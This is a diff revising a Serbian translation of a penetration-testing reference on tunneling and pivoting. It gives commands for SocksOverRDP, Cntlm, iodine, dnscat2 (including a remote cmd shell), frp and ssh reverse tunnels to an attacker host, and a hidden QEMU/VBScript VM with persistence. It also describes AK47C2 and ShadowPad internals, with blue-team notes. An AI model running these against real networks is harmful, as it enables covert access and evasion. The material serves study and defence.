+1. [SocksOverRDP x64 binarne datoteke](https://github.com/nccgroup/SocksOverRDP/releases) - Ovaj alat koristi `Dynamic Virtual Channels` (`DVC`) iz funkcije Remote Desktop Service u sistemu Windows. DVC je zadužen za **tunneling paketa preko RDP veze**.
+2. [Prenosiva binarna datoteka Proxifier](https://www.proxifier.com/download/#win-tab)
 
-Na svom client računaru učitajte **`SocksOverRDP-Plugin.dll`** na sledeći način:
+Na klijentskom računaru učitajte **`SocksOverRDP-Plugin.dll`** ovako:
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Sada možemo da se **povežemo** sa **žrtvom** preko **RDP-a** koristeći **`mstsc.exe`**, i trebalo bi da dobijemo **prompt** koji kaže da je **SocksOverRDP plugin** omogućen i da će **slušati** na **127.0.0.1:1080**.
+Sada možemo da se **povežemo** sa **žrtvom** preko **RDP-a** koristeći **`mstsc.exe`**, i trebalo bi da dobijemo **prompt** sa obaveštenjem da je **SocksOverRDP plugin** omogućen i da će **slušati** na **127.0.0.1:1080**.
 
-**Povežite se** putem **RDP-a** i otpremite i izvršite binarni fajl `SocksOverRDP-Server.exe` na računaru žrtve:
+**Povežite se** preko **RDP-a** i otpremite i pokrenite binarni fajl `SocksOverRDP-Server.exe` na računaru žrtve:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-Sada proverite na svojoj mašini (napadaču) da li port 1080 osluškuje:
+Sada, potvrdite na vašoj mašini (napadača) da port 1080 osluškuje:
 ```
 netstat -antb | findstr 1080
 ```
-Sada možete koristiti [**Proxifier**](https://www.proxifier.com/) za prosleđivanje saobraćaja kroz taj port.<sup>[[26]](#references)</sup>
+Sada možete koristiti [**Proxifier**](https://www.proxifier.com/) za usmeravanje saobraćaja kroz taj port.<sup>[[26]](#references)</sup>
 
 ## Proxify Windows GUI aplikacije
 
-Windows GUI aplikacije možete usmeravati kroz proxy koristeći [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
-U **Profile -> Proxy Servers** dodajte IP adresu i port SOCKS servera.\
-U **Profile -> Proxification Rules** dodajte naziv programa za proxify i konekcije ka IP adresama koje želite da proxify; Proxifier pravila mogu da obuhvate aplikacije, ciljne hostove i portove.<sup>[[27]](#references)</sup>
+Windows GUI aplikacije možete usmeriti kroz proxy pomoću alata [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
+U odeljku **Profile -> Proxy Servers** dodajte IP adresu i port SOCKS servera.\
+U odeljku **Profile -> Proxification Rules** dodajte naziv programa koji želite da usmerite kroz proxy i konekcije ka IP adresama koje želite da usmerite kroz proxy; Proxifier pravila mogu da podudaraju aplikacije, odredišne hostove i portove.<sup>[[27]](#references)</sup>
 
 ## Tunel kroz NTLM proxy
 
-Prethodno pomenuti alat, **Rpivot**, može prosleđivati saobraćaj kroz proxy koji zahteva NTLM autentifikaciju. **OpenVPN** takođe može rutirati saobraćaj kroz takav proxy kada je konfigurisan sa auth datotekom i NTLMv2 metodom; ovo je proxy traversal, a ne zaobilaženje proxy autentifikacije.<sup>[[20]](#references)[[28]](#references)</sup>
+Prethodno pomenuti alat, **Rpivot**, može da prosleđuje saobraćaj kroz proxy koji zahteva NTLM autentifikaciju. **OpenVPN** takođe može da usmerava saobraćaj kroz takav proxy kada je konfigurisan sa auth fajlom i NTLMv2 metodom; ovo je traversal kroz proxy, a ne zaobilaženje proxy autentifikacije.<sup>[[20]](#references)[[28]](#references)</sup>
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
 ```
@@ -457,8 +495,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Cntlm se autentifikuje na uzvodnim NTLM proxy-jima, izlaže lokalne listenere i može mapirati lokalni tunnel port na odredišni servis; klijenti zatim mogu koristiti taj lokalni port.<sup>[[29]](#references)</sup>\
-Na primer, to prosleđuje port 443
+Cntlm se autentifikuje na upstream NTLM proxy serverima, izlaže lokalne listenere i može da mapira lokalni tunnel port na odredišni servis; klijenti zatim mogu da koriste taj lokalni port.<sup>[[29]](#references)</sup>\
+Na primer, prosleđivanje porta 443
 ```
 Username Alice
 Password P@ssw0rd
@@ -466,12 +504,12 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Sada, ako na primer na žrtvi podesite **SSH** servis da osluškuje port 443, možete se povezati na njega preko porta 2222 na napadaču.<sup>[[29]](#references)</sup>\
-Takođe možete koristiti **meterpreter** koji se povezuje na localhost:443, dok napadač osluškuje port 2222.<sup>[[29]](#references)</sup>
+Sada, ako na primer na žrtvi podesite da **SSH** servis sluša na portu 443, možete se povezati s njim preko porta 2222 na napadaču.<sup>[[29]](#references)</sup>\
+Takođe možete koristiti **meterpreter** koji se povezuje na localhost:443, dok napadač osluškuje na portu 2222.<sup>[[29]](#references)</sup>
 
 ## YARP
 
-YARP (Yet Another Reverse Proxy) je Microsoft-ov .NET alat za reverse-proxy. Možete ga pronaći ovde: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>
+YARP (Yet Another Reverse Proxy) je Microsoft-ov .NET toolkit za reverse proxy. Možete ga pronaći ovde: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>
 
 ## DNS Tunneling
 
@@ -479,21 +517,21 @@ YARP (Yet Another Reverse Proxy) je Microsoft-ov .NET alat za reverse-proxy. Mo�
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Iodine kreira IPv4 tunel kroz DNS upite i koristi TUN interfejse; dokumentovano podešavanje zahteva privilegije potrebne za kreiranje tih interfejsa na obe strane.<sup>[[31]](#references)</sup>
+Iodine kreira IPv4 tunnel kroz DNS upite i koristi TUN interfejse; dokumentovano podešavanje zahteva privilegije potrebne za kreiranje tih interfejsa na oba kraja.<sup>[[31]](#references)</sup>
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-DNS transport ima veći overhead od direktnog TCP-a i obično je spor; možete kreirati kompresovanu SSH konekciju kroz ovaj tunel koristeći:<sup>[[31]](#references)</sup>
+DNS transport ima veći overhead od direktnog TCP-a i obično je spor; kroz ovaj tunel možete kreirati kompresovanu SSH konekciju tako što ćete koristiti:<sup>[[31]](#references)</sup>
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
 ### DNSCat2
 
-[**Preuzmite ga odavde**](https://github.com/iagox86/dnscat2)**.**
+[**Preuzmite ga ovde**](https://github.com/iagox86/dnscat2)**.**
 
-Dnscat2 uspostavlja šifrovani command-and-control kanal kroz DNS; server i client komande u nastavku prate njegovu dokumentovanu upotrebu.<sup>[[32]](#references)</sup>
+Dnscat2 uspostavlja šifrovani command-and-control kanal kroz DNS; komande servera i klijenta u nastavku prate njegovu dokumentovanu upotrebu.<sup>[[32]](#references)</sup>
 ```bash
 attacker> ruby ./dnscat2.rb tunneldomain.com
 victim> ./dnscat2 tunneldomain.com
@@ -502,60 +540,60 @@ victim> ./dnscat2 tunneldomain.com
 attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
 victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
-#### **U PowerShell-u**
+#### **In PowerShell**
 
-Možete koristiti [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) za pokretanje dnscat2 klijenta u PowerShell-u; njegov README dokumentuje parametre `Start-Dnscat2` prikazane u nastavku.<sup>[[33]](#references)</sup>
+Možete koristiti [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) za pokretanje dnscat2 client-a u PowerShell-u; njegov README dokumentuje `Start-Dnscat2` parametre prikazane u nastavku.<sup>[[33]](#references)</sup>
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
 ```
 #### **Prosleđivanje portova pomoću dnscat**
 
-Dnscat2-ova interaktivna komanda `listen` mapira lokalni listener na udaljeni host i port.<sup>[[32]](#references)</sup>
+Interaktivna komanda `listen` u alatu Dnscat2 mapira lokalni listener na udaljeni host i port.<sup>[[32]](#references)</sup>
 ```bash
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
-#### Promena DNS-a za proxychains
+#### Promena proxychains DNS
 
-Proxychains-ng dinamički presreće TCP veze i ne može da prenosi UDP ili ICMP; DNS proxying je podesiv, zato pregledajte instalirani `proxychains.conf` i resolver helper umesto da pretpostavljate fiksni javni resolver. Legacy `proxyresolv` skripte izlažu `PROXY_DNS_SERVER` za izbor resolvera; koristite resolver dostupan sa pivot-a kada su potrebna interna imena.<sup>[[34]](#references)[[35]](#references)</sup>
+Proxychains-ng dinamički presreće TCP konekcije i ne može da prenosi UDP ili ICMP; DNS proxying se može konfigurisati, zato proverite instalirani `proxychains.conf` i resolver helper umesto da pretpostavljate fiksni javni resolver. Legacy `proxyresolv` skripte izlažu `PROXY_DNS_SERVER` za izbor resolvera; koristite resolver dostupan preko pivot-a kada su potrebna interna imena.<sup>[[34]](#references)[[35]](#references)</sup>
 
 ## Tuneli u Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
-### Prilagođeni DNS TXT / HTTP JSON C2 (AK47C2)
+### Custom DNS TXT / HTTP JSON C2 (AK47C2)
 
-Storm-2603 actor je kreirao **dual-channel C2 ("AK47C2")** koji zloupotrebljava *samo* izlazni **DNS** i **plain HTTP POST** saobraćaj – dva protokola koja su retko blokirana na korporativnim mrežama.<sup>[[2]](#references)</sup>
+Aktor Storm-2603 kreirao je **dual-channel C2 ("AK47C2")** koji zloupotrebljava *samo* odlazni **DNS** i **plain HTTP POST** saobraćaj – dva protokola koji su retko blokirani na korporativnim mrežama.<sup>[[2]](#references)</sup>
 
 1. **DNS mode (AK47DNS)**
 • Generiše nasumični 5-karakterni SessionID (npr. `H4T14`).
-• Dodaje `1` za *task requests* ili `2` za *results* i konkatenira različita polja (flags, SessionID, computer name).
-• Svako polje je **XOR-enkriptovano ASCII ključem `VHBD@H`**, hex-encoded i spojeno tačkama – na kraju se dodaje domen pod kontrolom attackera:
+• Dodaje `1` za *task requests* ili `2` za *results* i konkatenira različita polja (flags, SessionID, ime računara).
+• Svako polje se **XOR-enkriptuje ASCII ključem `VHBD@H`**, hex-enkoduje i spaja tačkama – a na kraju se dodaje domen pod kontrolom napadača:
 
 ```text
 <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
 ```
 
-• Zahtevi koriste `DnsQuery()` za **TXT** (i fallback **MG**) records.
-• Kada response premaši 0xFF bytes, backdoor **fragmentira** podatke na delove od 63 bytes i ubacuje markere:
-`s<SessionID>t<TOTAL>p<POS>` kako bi C2 server mogao da ih ponovo poređa.
+• Zahtevi koriste `DnsQuery()` za **TXT** (i rezervni **MG**) records.
+• Kada odgovor premaši 0xFF bajtova, backdoor **fragmentira** podatke u delove od 63 bajta i umeće markere:
+`s<SessionID>t<TOTAL>p<POS>` kako bi C2 server mogao da ih poređa.
 
 2. **HTTP mode (AK47HTTP)**
-• Kreira JSON envelope:
+• Formira JSON envelope:
 ```json
 {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
 ```
-• Ceo blob je XOR-`VHBD@H` → hex → šalje se kao body **`POST /`** zahteva sa header-om `Content-Type: text/plain`.
-• Reply prati isto encoding pravilo, a `cmd` polje se izvršava pomoću `cmd.exe /c <command> 2>&1`.
+• Ceo blob se XOR-uje ključem `VHBD@H` → hex → šalje kao telo **`POST /`** zahteva sa headerom `Content-Type: text/plain`.
+• Odgovor prati isto enkodovanje, a polje `cmd` se izvršava pomoću `cmd.exe /c <command> 2>&1`.
 
-Napomene za Blue Team
-• Potražite neuobičajene **TXT queries** čiji je prvi label dugačak hexadecimal i koji se uvek završavaju istim retkim domenom.
-• Konstantni XOR ključ praćen ASCII-hex vrednostima lako je detektovati pomoću YARA: `6?56484244?484` (`VHBD@H` u hex formatu).
+Beleške za Blue Team
+• Potražite neuobičajene **TXT queries** čija je prva labela dugačak hexadecimal i koje se uvek završavaju istim retkim domenom.
+• Konstantni XOR ključ praćen ASCII-hex vrednošću lako se detektuje pomoću YARA: `6?56484244?484` (`VHBD@H` u hex formatu).
 • Za HTTP označite text/plain POST bodies koji sadrže isključivo hex i imaju paran broj bajtova.
 
 {{#note}}
-Channel održava svaki sub-domain label unutar DNS limita od 63 octets, ali sama usklađenost sa protokolom ne čini ga stealthy; retki domeni, dugački hexadecimal labels i količina query-ja i dalje predstavljaju detection signals.<sup>[[2]](#references)[[36]](#references)</sup>
+Channel zadržava svaku sub-domain labelu unutar DNS limita od 63 okteta, ali sama usklađenost sa protokolom ne čini ga stealthy; retki domeni, duge hexadecimal labele i obim query-ja i dalje predstavljaju indikatore za detekciju.<sup>[[2]](#references)[[36]](#references)</sup>
 {{#endnote}}
 
 ## ICMP Tunneling
@@ -565,7 +603,7 @@ Channel održava svaki sub-domain label unutar DNS limita od 63 octets, ali sama
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Hans dokumentuje IPv4-over-ICMP tunnel koji koristi TUN device i ICMP echo requests; setup zahteva privilegije dovoljne za kreiranje interface-a.<sup>[[37]](#references)</sup>
+Hans dokumentuje IPv4-over-ICMP tunnel koji koristi TUN uređaj i ICMP echo requests; podešavanje zahteva privilegije dovoljne za kreiranje interfejsa.<sup>[[37]](#references)</sup>
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -591,7 +629,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-[**ngrok**](https://ngrok.com/) je agent za postavljanje lokalnih mrežnih servisa na internet putem sigurnog tunela; njegov CLI dokumentuje HTTP, TCP i file URL endpoints, a odštampano ime hosta endpointa može da varira u zavisnosti od endpointa i naloga.<sup>[[39]](#references)</sup>
+[**ngrok**](https://ngrok.com/) je agent za postavljanje lokalnih mrežnih servisa na internet putem bezbednog tunela; njegov CLI dokumentuje HTTP, TCP i file URL endpoints, a odštampani hostname endpointa može da se razlikuje u zavisnosti od endpointa i naloga.<sup>[[39]](#references)</sup>
 
 ### Instalacija
 
@@ -607,7 +645,7 @@ chmod a+x ./ngrok
 
 **Dokumentacija:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-_Agent takođe podržava opcije za autentifikaciju i TLS kada je to potrebno.<sup>[[39]](#references)</sup>_
+_Agent takođe podržava opcije za autentifikaciju i TLS kada su potrebne.<sup>[[39]](#references)</sup>_
 
 #### Tunelovanje TCP
 ```bash
@@ -625,23 +663,23 @@ _Agent takođe podržava opcije za autentifikaciju i TLS kada je to potrebno.<su
 #### Sniffing HTTP poziva
 
 _Korisno za XSS,SSRF,SSTI ..._\
-Samostalni agent podrazumevano izlaže svoj HTTP inspection interfejs na `http://127.0.0.1:4040`; interfejs služi za HTTP saobraćaj.<sup>[[40]](#references)</sup>
+Samostalni agent podrazumevano izlaže svoj interfejs za HTTP inspekciju na `http://127.0.0.1:4040`; interfejs je namenjen HTTP saobraćaju.<sup>[[40]](#references)</sup>
 
 #### Tunneling internog HTTP servisa
 
-Opcija `--host-header=rewrite` prepisuje upstream HTTP `Host` header tako da odgovara lokalnom servisu.<sup>[[41]](#references)</sup>
+Opcija `--host-header=rewrite` prepisuje upstream HTTP `Host` zaglavlje tako da odgovara lokalnom servisu.<sup>[[41]](#references)</sup>
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 # With basic auth
 ./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
 ```
-#### ngrok.yaml jednostavan primer konfiguracije
+#### ngrok.yaml primer jednostavne konfiguracije
 
 Ovo koristi ngrok Agent Config v2; imenovani tuneli koriste `proto` i `addr`, a pokreću se pomoću `ngrok start`.<sup>[[42]](#references)</sup> Otvara 3 tunela:
 
 - 2 TCP
-- 1 HTTP sa izlaganjem statičkih datoteka iz /tmp/httpbin/
+- 1 HTTP sa izlaganjem statičkih datoteka iz direktorijuma /tmp/httpbin/
 ```yaml
 version: 2
 tunnels:
@@ -657,24 +695,24 @@ addr: file:///tmp/httpbin/
 ```
 ## Cloudflared (Cloudflare Tunnel)
 
-Cloudflare Tunnel `cloudflared` konektor uspostavlja outbound connections; objavljene aplikacije mogu usmeravati HTTP, HTTPS, TCP, SSH i RDP, dok su quick tunnels namenjeni HTTP development-u.<sup>[[43]](#references)[[45]](#references)</sup>
+Cloudflare Tunnel `cloudflared` konektor uspostavlja izlazne veze; objavljene aplikacije mogu usmeravati HTTP, HTTPS, TCP, SSH i RDP, dok su quick tunnels namenjeni HTTP razvoju.<sup>[[43]](#references)[[45]](#references)</sup>
 
-### Jednolinijska komanda za Quick tunnel
+### Jednolinijska komanda za quick tunnel
 ```bash
 # Expose a local web service listening on 8080
 cloudflared tunnel --url http://localhost:8080
 # => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
 ```
-### SOCKS5 origin (legacy režim)
+### SOCKS5 poreklo (nasleđeni režim)
 
-Legacy `--socks5` flag govori alatu `cloudflared` da lokalni origin koristi SOCKS5; ne kreira lokalni SOCKS5 listener. Za managed tunnel, `originRequest.proxyType: socks` konfiguriše SOCKS5 handling za origin.<sup>[[44]](#references)</sup>
+Nasleđena oznaka `--socks5` govori alatu `cloudflared` da lokalni origin koristi SOCKS5; ona ne kreira lokalni SOCKS5 listener. Za managed tunnel, `originRequest.proxyType: socks` konfiguriše SOCKS5 rukovanje originom.<sup>[[44]](#references)</sup>
 ```bash
 # Expose a local SOCKS5-speaking origin (legacy syntax)
 cloudflared tunnel --url socks5://localhost:1080 --socks5
 ```
-### Persistent tunnels with DNS
+### Trajni tuneli sa DNS-om
 
-Lokalno upravljana konfiguracija za `tunnel` koristi ključeve `tunnel`, `credentials-file` i `url` napisane malim slovima, kao što je prikazano u nastavku.<sup>[[46]](#references)</sup>
+Lokalno upravljana konfiguracija tunela koristi ključeve `tunnel`, `credentials-file` i `url` napisane malim slovima, kao što je prikazano u nastavku.<sup>[[46]](#references)</sup>
 ```bash
 cloudflared tunnel create mytunnel
 cloudflared tunnel route dns mytunnel internal.example.com
@@ -687,13 +725,13 @@ Pokrenite konektor:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Konektor uspostavlja odlazne veze i, podrazumevano, pregovara o QUIC-u uz fallback na HTTP/2; nemojte pretpostaviti da svaka implementacija koristi TCP/443. Pokrenite ga samo sa privilegijama potrebnim za vašu implementaciju.<sup>[[43]](#references)[[47]](#references)</sup>
+Connector uspostavlja izlazne veze i, podrazumevano, pregovara QUIC uz fallback na HTTP/2; ne pretpostavljajte da svaka implementacija koristi TCP/443. Pokrenite ga samo sa privilegijama koje su potrebne vašoj implementaciji.<sup>[[43]](#references)[[47]](#references)</sup>
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) je Go reverse proxy koji podržava **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX i XTCP**. XTCP koristi P2P hole punching, čiji uspeh zavisi od NAT-a. Počev od **v0.53.0**, može da funkcioniše kao **SSH Tunnel Gateway**, tako da ciljni host može da koristi standardni OpenSSH klijent bez `frpc` binarne datoteke.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>
+[`frp`](https://github.com/fatedier/frp) je Go reverse proxy koji podržava **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX i XTCP**. XTCP koristi P2P hole punching čiji uspeh zavisi od NAT-a. Počevši od **v0.53.0**, može da funkcioniše kao **SSH Tunnel Gateway**, tako da ciljni host može da koristi standardni OpenSSH client bez `frpc` binary-ja.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>
 
-### Klasični reverzni TCP tunel
+### Klasični reverse TCP tunnel
 ```bash
 # Attacker / server
 ./frps -c frps.toml            # listens on 0.0.0.0:7000
@@ -721,13 +759,13 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-Gorenja komanda objavljuje port **8080** žrtve kao **attacker_ip:9000** koristeći standardni OpenSSH klijent, dok `frps` obezbeđuje gateway.<sup>[[50]](#references)</sup>
+Gorenja komanda objavljuje port žrtve **8080** kao **attacker_ip:9000** koristeći standardni OpenSSH klijent, dok `frps` obezbeđuje gateway.<sup>[[50]](#references)</sup>
 
-## Covert VM-based Tunnels with QEMU
+## Prikriveni tuneli zasnovani na VM-u sa QEMU
 
-QEMU user-mode networking ne zahteva root ili administratorske privilegije za virtuelnu mrežu, a `-netdev user,hostfwd=...` preusmerava TCP, UDP ili UNIX connections sa hosta na guest.<sup>[[51]](#references)</sup> TrustedSec je dokumentovao Tiny Core QEMU VM i pokušaj reverse SSH tunnel-a u incidentu u kojem je EDR usmeren na host mogao da propusti aktivnost unutar guest-a.<sup>[[1]](#references)</sup>
+QEMU user-mode networking ne zahteva root niti administratorske privilegije za virtuelnu mrežu, a `-netdev user,hostfwd=...` preusmerava TCP, UDP ili UNIX connections sa hosta na guest.<sup>[[51]](#references)</sup> TrustedSec je dokumentovao Tiny Core QEMU VM i pokušaj reverse SSH tunela u incidentu u kojem je EDR fokusiran na host mogao da propusti aktivnost unutar guest-a.<sup>[[1]](#references)</sup>
 
-### Quick one-liner
+### Brza jednolinijska komanda
 ```powershell
 # Windows victim (user-mode networking; no TAP driver is needed for this example)
 qemu-system-x86_64.exe ^
@@ -737,13 +775,13 @@ qemu-system-x86_64.exe ^
 -device e1000,netdev=n0 ^
 -nographic
 ```
-• Komanda iznad pokreće **Tiny Core Linux** guest sa 256 MiB guest memorije i qcow2 disk image-om; disk image nije disk u RAM-u.
-• Port **2222/tcp** na Windows hostu transparentno se prosleđuje na **22/tcp** unutar guesta.
-• Iz ugla napadača, target jednostavno izlaže port 2222; sve pakete koji do njega stignu obrađuje SSH server koji radi u VM-u.
+• Gornja komanda pokreće **Tiny Core Linux** gosta sa 256 MiB memorije gosta i qcow2 slikom diska; slika diska nije disk u RAM-u.
+• Port **2222/tcp** na Windows hostu transparentno se prosleđuje na **22/tcp** unutar gosta.
+• Iz perspektive napadača, cilj jednostavno izlaže port 2222; svim paketima koji do njega stignu upravlja SSH server pokrenut u VM-u.
 
 ### Neupadljivo pokretanje putem VBScript-a
 
-TrustedSec je u incidentu navedenom iznad uočio QEMU pokretanja upravljana pomoću VBS-a i Tiny Core image-e.<sup>[[1]](#references)</sup>
+TrustedSec je u gore navedenom incidentu uočio pokretanje QEMU-a putem VBS-a i Tiny Core images.<sup>[[1]](#references)</sup>
 ```vb
 ' update.vbs – lived in C:\ProgramData\update
 Set o = CreateObject("Wscript.Shell")
@@ -751,11 +789,11 @@ o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tc
 ```
 Pokretanje skripte pomoću `cscript.exe //B update.vbs` održava prozor skrivenim.<sup>[[1]](#references)</sup>
 
-### Persistence unutar gosta
+### Persistence unutar guest-a
 
-Navodni incident opisuje persistence u stateless Tiny Core guest-u kroz `/opt/bootlocal.sh` i `/opt/filetool.lst`:<sup>[[1]](#references)</sup>
+Citirani incident opisuje persistence u stateless Tiny Core guest-u kroz `/opt/bootlocal.sh` i `/opt/filetool.lst`:<sup>[[1]](#references)</sup>
 
-1. Sačuvajte payload u `/opt/123.out`
+1. Smestite payload u `/opt/123.out`
 2. Dodajte u `/opt/bootlocal.sh`:
 
 ```sh
@@ -768,23 +806,23 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ### Razmatranja telemetrije
 
 • Host i dalje izlaže QEMU proces, qcow2 image i svaki listener prosleđen sa hosta.
-• Skeniranja procesa ograničena na host možda neće pregledati guest procese, ali virtualization nije garantovano izbegavanje; network, QEMU i image telemetry i dalje mogu da ga otkriju.<sup>[[1]](#references)[[51]](#references)</sup>
+• Skeniranja procesa ograničena na host možda neće pregledati guest procese, ali virtualization nije garantovano izbegavanje; mrežna, QEMU i image telemetrija i dalje mogu da ga otkriju.<sup>[[1]](#references)[[51]](#references)</sup>
 
 ### Saveti za defendere
 
-• Postavite alert za **neočekivane QEMU/VirtualBox/KVM binary-je** u putanjama u koje korisnik može da upisuje.
-• Blokirajte outbound konekcije koje potiču od `qemu-system*.exe`.
+• Postavite alert za **neočekivane QEMU/VirtualBox/KVM binaries** u putanjama u koje korisnik može da upisuje.
+• Blokirajte outbound connections koje potiču od `qemu-system*.exe`.
 • Tražite retke listening portove (2222, 10022, …) koji se bind-uju neposredno nakon pokretanja QEMU-a.
 
-## IIS/HTTP.sys relay nodes putem `HttpAddUrl` (ShadowPad)
+## IIS/HTTP.sys relay nodes preko `HttpAddUrl` (ShadowPad)
 
-Check Point opisuje ShadowPad IIS modul kao komponentu koja kompromitovane perimeter web servere pretvara u backdoor i relay nodes tako što bind-uje URL prefixes putem `HttpAddUrl`.<sup>[[3]](#references)</sup>
+Check Point opisuje ShadowPad IIS module kao način pretvaranja kompromitovanih perimeter web servera u backdoor i relay nodes vezivanjem URL prefix-a preko `HttpAddUrl`.<sup>[[3]](#references)</sup>
 
-Isti izveštaj detaljno opisuje podrazumevane vrednosti, wildcard listeners, packet decryption, relay queues i debug telemetry, sažete u nastavku.<sup>[[3]](#references)</sup>
+Isti report detaljno opisuje default vrednosti, wildcard listeners, decryption paketa, relay queues i debug telemetry, sažete u nastavku.<sup>[[3]](#references)</sup>
 
-* **Config defaults** – ako JSON config modula izostavi vrednosti, modul koristi uverljive IIS defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Na taj način IIS odgovara na benign traffic koristeći odgovarajući branding.
-* **Wildcard interception** – operatori prosleđuju listu URL prefixes razdvojenih tačkom-zarezom (wildcards u host-u i path-u). Modul poziva `HttpAddUrl` za svaki unos, pa HTTP.sys rutira odgovarajuće requestove do malicious handler-a; requestovi koji se ne podudaraju vraćaju se na uobičajeno IIS ponašanje.
-* **Encrypted first packet** – prva dva bajta request body-ja nose seed za prilagođeni 32-bitni PRNG. Svaki naredni bajt se XOR-uje sa generisanim keystream-om pre protocol parsing-a:
+* **Config defaults** – ako JSON config module-a izostavi vrednosti, koristi uverljive IIS defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Na taj način IIS odgovara na benigni saobraćaj koristeći ispravan branding.
+* **Wildcard interception** – operatori prosleđuju listu URL prefix-a razdvojenih tačka-zarezom (wildcards u host-u i path-u). Module poziva `HttpAddUrl` za svaki unos, pa HTTP.sys prosleđuje matching requests malicious handler-u; zahtevi koji se ne podudaraju vraćaju se na normalno IIS ponašanje.
+* **Encrypted first packet** – prva dva bajta request body-ja sadrže seed za prilagođeni 32-bitni PRNG. Svaki naredni bajt se XOR-uje sa generisanim keystream-om pre protocol parsing-a:
 
 ```python
 def decrypt_first_packet(buf):
@@ -798,26 +836,26 @@ out[i] ^= num & 0xFF
 return out
 ```
 
-* **Relay orchestration** – modul održava dve liste: „servers“ (upstream nodes) i „clients“ (downstream implants). Unosi se uklanjaju ako heartbeat ne stigne u roku od približno 30 sekundi. Kada obe liste nisu prazne, modul uparuje prvi healthy server sa prvim healthy client-om i jednostavno prosleđuje bajtove između njihovih socket-a dok jedna strana ne zatvori konekciju.
-* **Debug telemetry** – opciono logging beleži source IP, destination IP i ukupan broj prosleđenih bajtova za svako uparivanje. Investigatori su te breadcrumbs koristili za rekonstrukciju ShadowPad mesh-a koji se prostirao kroz više žrtava.
+* **Relay orchestration** – module održava dve liste: „servers“ (upstream nodes) i „clients“ (downstream implants). Unosi se uklanjaju ako heartbeat ne stigne u roku od približno 30 sekundi. Kada nijedna lista nije prazna, uparuje prvi healthy server sa prvim healthy client-om i jednostavno prosleđuje bytes između njihovih sockets-a dok jedna strana ne zatvori vezu.
+* **Debug telemetry** – opciono logging beleži source IP, destination IP i ukupan broj prosleđenih bytes-a za svako uparivanje. Investigatori su koristili te breadcrumbs za rekonstrukciju ShadowPad mesh-a koji se prostirao kroz više victims-a.
 
 ---
 
-## Drugi alati za proveru
+## Ostali tools za proveru
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 - [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
 ## References
 
-- [1] [Skrivanje u senkama: Covert Tunnels putem QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
+- [1] [Skrivanje u senkama: Covert tunnels preko QEMU virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
 - [2] [Check Point Research – Pre ToolShell-a: Istraživanje prethodnih ransomware operacija grupe Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
